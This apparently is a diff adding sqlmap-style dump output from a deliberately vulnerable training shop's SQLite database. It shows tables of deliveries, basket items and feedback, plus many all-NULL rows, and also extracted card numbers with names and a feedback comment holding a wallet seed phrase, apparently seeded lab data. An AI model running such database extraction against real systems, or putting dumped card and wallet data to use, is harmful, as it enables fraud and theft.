+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
+| NULL | NULL      | NULL     | NULL      | NULL      | NULL         |
++------+-----------+----------+-----------+-----------+--------------+
+
+Database: SQLite_masterdb
+Table: Products
+[46 entries]
++------+------+-------+-------+-----------+-----------+-----------+-------------+-------------+
+| id   | name | price | image | updatedAt | deletedAt | createdAt | description | deluxePrice |
++------+------+-------+-------+-----------+-----------+-----------+-------------+-------------+
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
+| NULL | NULL | NULL  | NULL  | NULL      | NULL      | NULL      | NULL        | NULL        |
++------+------+-------+-------+-----------+-----------+-----------+-------------+-------------+
+
+Database: SQLite_masterdb
+Table: Deliveries
+[3 entries]
++----+-----+-------------------+----------------------+-------+--------------------------------+--------------------------------+-------------+
+| id | eta | name              | icon                 | price | updatedAt                      | createdAt                      | deluxePrice |
++----+-----+-------------------+----------------------+-------+--------------------------------+--------------------------------+-------------+
+| 1  | 1.0 | One Day Delivery  | fas fa-rocket        | 0.99  | 2026-03-04 18:14:17.371 +00:00 | 2026-03-04 18:14:17.371 +00:00 | 0.5         |
+| 2  | 3.0 | Fast Delivery     | fas fa-shipping-fast | 0.5   | 2026-03-04 18:14:17.371 +00:00 | 2026-03-04 18:14:17.371 +00:00 | 0.0         |
+| 3  | 5.0 | Standard Delivery | fas fa-truck         | 0.0   | 2026-03-04 18:14:17.371 +00:00 | 2026-03-04 18:14:17.371 +00:00 | 0.0         |
++----+-----+-------------------+----------------------+-------+--------------------------------+--------------------------------+-------------+
+
+Database: SQLite_masterdb
+Table: Captchas
+[0 entries]
++----+-----------+--------+---------+-----------+-----------+
+| id | captchaId | answer | captcha | updatedAt | createdAt |
++----+-----------+--------+---------+-----------+-----------+
++----+-----------+--------+---------+-----------+-----------+
+
+Database: SQLite_masterdb
+Table: Cards
+[6 entries]
++----+--------+------------------+---------+----------+------------------+--------------------------------+--------------------------------+
+| id | UserId | cardNum          | expYear | expMonth | fullName         | updatedAt                      | createdAt                      |
++----+--------+------------------+---------+----------+------------------+--------------------------------+--------------------------------+
+| 1  | 4      | 4815205605542754 | 2092    | 12       | Bjoern Kimminich | 2026-03-04 18:14:16.743 +00:00 | 2026-03-04 18:14:16.743 +00:00 |
+| 2  | 17     | 1234567812345678 | 2099    | 12       | Tim Tester       | 2026-03-04 18:14:16.759 +00:00 | 2026-03-04 18:14:16.759 +00:00 |
+| 3  | 1      | 4716190207394368 | 2081    | 2        | Administrator    | 2026-03-04 18:14:16.760 +00:00 | 2026-03-04 18:14:16.760 +00:00 |
+| 4  | 1      | 4024007105648108 | 2086    | 4        | Administrator    | 2026-03-04 18:14:16.760 +00:00 | 2026-03-04 18:14:16.760 +00:00 |
+| 5  | 2      | 5107891722278705 | 2099    | 11       | Jim              | 2026-03-04 18:14:16.762 +00:00 | 2026-03-04 18:14:16.762 +00:00 |
+| 6  | 3      | 4716943969046208 | 2081    | 2        | Bender           | 2026-03-04 18:14:16.763 +00:00 | 2026-03-04 18:14:16.763 +00:00 |
++----+--------+------------------+---------+----------+------------------+--------------------------------+--------------------------------+
+
+Database: SQLite_masterdb
+Table: BasketItems
+[8 entries]
++----+----------+-----------+----------+--------------------------------+--------------------------------+
+| id | BasketId | ProductId | quantity | updatedAt                      | createdAt                      |
++----+----------+-----------+----------+--------------------------------+--------------------------------+
+| 1  | 1        | 1         | 2        | 2026-03-04 18:14:17.301 +00:00 | 2026-03-04 18:14:17.301 +00:00 |
+| 2  | 1        | 2         | 3        | 2026-03-04 18:14:17.301 +00:00 | 2026-03-04 18:14:17.301 +00:00 |
+| 3  | 1        | 3         | 1        | 2026-03-04 18:14:17.301 +00:00 | 2026-03-04 18:14:17.301 +00:00 |
+| 7  | 5        | 3         | 2        | 2026-03-04 18:14:17.301 +00:00 | 2026-03-04 18:14:17.301 +00:00 |
+| 4  | 2        | 4         | 1        | 2026-03-04 18:14:17.301 +00:00 | 2026-03-04 18:14:17.301 +00:00 |
+| 5  | 3        | 4         | 2        | 2026-03-04 18:14:17.301 +00:00 | 2026-03-04 18:14:17.301 +00:00 |
+| 6  | 4        | 4         | 5        | 2026-03-04 18:14:17.301 +00:00 | 2026-03-04 18:14:17.301 +00:00 |
+| 8  | 5        | 4         | 2        | 2026-03-04 18:14:17.301 +00:00 | 2026-03-04 18:14:17.301 +00:00 |
++----+----------+-----------+----------+--------------------------------+--------------------------------+
+
+Database: SQLite_masterdb
+Table: Feedbacks
+[8 entries]
++----+--------+--------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------+--------------------------------+
+| id | UserId | rating | comment                                                                                                                                                                              | updatedAt                      | createdAt                      |
++----+--------+--------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------+--------------------------------+
+| 1  | 1      | 5      | I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)                                                                                                     | 2026-03-04 18:14:16.740 +00:00 | 2026-03-04 18:14:16.740 +00:00 |
+| 2  | 2      | 4      | Great shop! Awesome service! (***@juice-sh.op)                                                                                                                                       | 2026-03-04 18:14:16.741 +00:00 | 2026-03-04 18:14:16.741 +00:00 |
+| 3  | 3      | 1      | Nothing useful avai                                                                                                                                                                  | 2026-03-04 18:14:16.742 +00:00 | 2026-03-04 18:14:16.742 +00:00 |
+| 4  | 21     | 1      | Please send me the juicy chatbot NFT in my wallet at /juicy-nft : "purpose betray marriage blame crunch monitor spin slide donate sport lift clutch" (***ereum@juice-sh.op)          | 2026-03-04 18:14:16.754 +00:00 | 2026-03-04 18:14:16.754 +00:00 |
+| 5  | NULL   | 2      | Incompetent customer support! Can't even upload photo of broken purchase!<br /><em>Support Team: Sorry, only order confirmation PDFs can be attached to complaints!</em> (anonymous) | 2026-03-04 18:14:17.308 +00:00 | 2026-03-04 18:14:17.308 +00:00 |
+| 6  | NULL   | 4      | This is <b>the</b> store for awesome stuff of all kinds! (anonymous)                                                                                                                 | 2026-03-04 18:14:17.309 +00:00 | 2026-03-04 18:14:17.309 +00:00 |
+| 7  | NULL   | 4      | Never gonna buy anywhere else from now on! Thanks for the great service! (anonymous)                                                                                                 | 2026-03-04 18:14:17.309 +00:00 | 2026-03-04 18:14:17.309 +00:00 |
+| 8  | NULL   | 3      | Keep up the good work! (anonymous)                                                                                                                                                   | 2026-03-04 18:14:17.309 +00:00 | 2026-03-04 18:14:17.309 +00:00 |
++----+--------+--------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------+--------------------------------+
+
+Database: SQLite_masterdb
+Table: Hints
+[378 entries]
++------+-------------+------+-------+----------+-----------+-----------+
+| id   | ChallengeId | text | order | unlocked | updatedAt | createdAt |
++------+-------------+------+-------+----------+-----------+-----------+
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
+| NULL | NULL        | NULL | NULL  | NULL     | NULL      | NULL      |
